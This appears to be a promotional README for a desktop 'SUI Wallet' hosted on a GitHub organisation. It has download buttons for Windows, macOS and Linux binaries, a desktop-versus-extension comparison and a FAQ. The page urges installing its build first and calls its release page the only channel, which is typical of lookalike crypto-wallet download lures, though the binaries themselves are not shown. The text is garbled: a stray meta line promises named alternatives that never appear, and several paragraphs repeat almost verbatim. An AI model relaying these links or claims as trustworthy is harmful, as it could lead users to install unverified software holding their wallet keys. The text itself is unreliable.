![SUI Wallet](assets/banner-article.png)

# Choosing the best Sui wallet for desktop

The only comparison in this set, and it names the alternatives it compares.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

For a desktop user the criteria are narrow: whether a native desktop build exists at all, who holds the
keys, whether a hardware wallet can sign, and whether the release can be verified. This product is a
self-custody desktop application with Ledger pairing and a published digest - and a browser extension solves
a different problem.

## The four criteria that decide it

Start with shape, because it eliminates most of the field before any feature comparison. A wallet that only exists as a browser extension is not a desktop wallet, and no amount of feature parity changes that. Then ask who holds the keys, and whether a hardware wallet can sign.

Then ask who holds the keys. Then whether a hardware wallet can authorise transactions. Then whether the
binary you are about to run can be checked against something the publisher signed. Those four questions are
answerable in a few minutes, and they matter more than any list of supported tokens.

## Desktop app versus browser extension

An extension lives inside a browser profile: it opens from a toolbar, it is limited by the browser's
sandbox, and it disappears when the profile does. That is a reasonable shape for using applications in a
browser, and it is a different shape from a program with its own window and its own storage.

[What is SUI Wallet for desktop?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-is-sui-wallet-desktop.md) describes what this application does. The practical difference shows
up at signing time: a desktop window can sit beside the site, name the site in its approval, and hold the
account independently of whichever browser is open.

The difference is not about which is modern; it is about where the account lives when the browser closes. A desktop application keeps its own window and its own storage, so the account is present whether or not a profile is open, and a signing request can be read beside the site instead of inside it.

## Self-custody versus hosted

A hosted wallet holds your balance on your behalf: you log in, and somebody else's system signs. That is convenient, recoverable through customer support, and not ownership of anything. Self-custody means the keys are generated and stored on your machine, so no operator can move or freeze the funds.

Self-custody means the keys are generated and stored on your machine, which means no operator can move or
freeze the funds - and no operator can restore them either. The phrase is the backup, and it is the only
one. A wallet that offers both is offering two different products in one window; know which account you are
in before you send anything.

## Hardware signing

A hardware wallet puts the approval somewhere the computer cannot reach: the key stays on the device and a
transaction needs a physical confirmation. For a balance you would not want to lose, that is the single
largest improvement available over a software account on a general-purpose machine.

This product pairs with Ledger devices through the official Sui app, supports the Nano S Plus, Nano X, Stax
and Flex, and distinguishes the connection failures from a lost device.
[Pairing Ledger with SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/pairing-ledger-with-sui-wallet.md) covers the pairing and the three states it can fail into.

That improvement is worth stating plainly because it is the reason a desktop wallet matters at all. A software account on a general-purpose machine is one malicious download away from a signature nobody intended; a hardware account turns that download into a prompt you still have to approve on a device with no network connection.

## Verifying a release

A wallet is software that runs with your permissions, so the release you install matters as much as the
features it lists. Verification means three things: the release comes from the publisher's own repository,
the digest of the file you downloaded matches the published one, and the licence is visible in the same
place.

The single distribution channel is a feature rather than a limitation. [what happened to Sui Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-happened-to-sui-wallet.md)
explains why the name is crowded with lookalikes, and why one release page is the defence against them.

## Which fits which reader

A reader who wants to use dApps inside a browser, on several machines, with nothing installed, is served by an extension from its own publisher. A reader who wants a desktop program, a hardware wallet on a port and a build they can verify is served by this application.

A reader who wants a desktop program, a hardware wallet on a port, a window beside the site and a build they
can verify is served by this application. The two are not competitors so much as different answers to
different questions, and the mistake is choosing by name rather than by shape.

## FAQ

### Is there a mobile version of SUI Wallet?

No. The product is desktop only, with builds for Windows, macOS and Linux, and it says so on the download
page rather than leaving it to be discovered.

### Are Sui wallets easy to use?

The first session is short in any of them: install, create or sign in, write the phrase down. Difficulty
appears later, at the first signature and the first backup, which is where these guides spend their length.

### How do I store Sui crypto?

In an account whose keys you hold, with the 24 words on paper somewhere the machine is not. Custody on an
exchange is a different arrangement with a different risk.

### Does this work on macOS and Linux?

Yes, alongside Windows. The published requirements are Windows 10 (1909) or later 64-bit, macOS 12 or
later, and x64 Linux with Ubuntu 20.04 or later or an equivalent.

### Is a browser extension safer than a desktop app?

Neither shape is inherently safer; the difference is what they can do. A desktop app can hold the account
independently of a browser and pair with a hardware wallet, which an extension does differently.

### Where do I get it?

From the project's [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest),
which is the only distribution channel - no mirrors, no store listings, no third-party downloads.
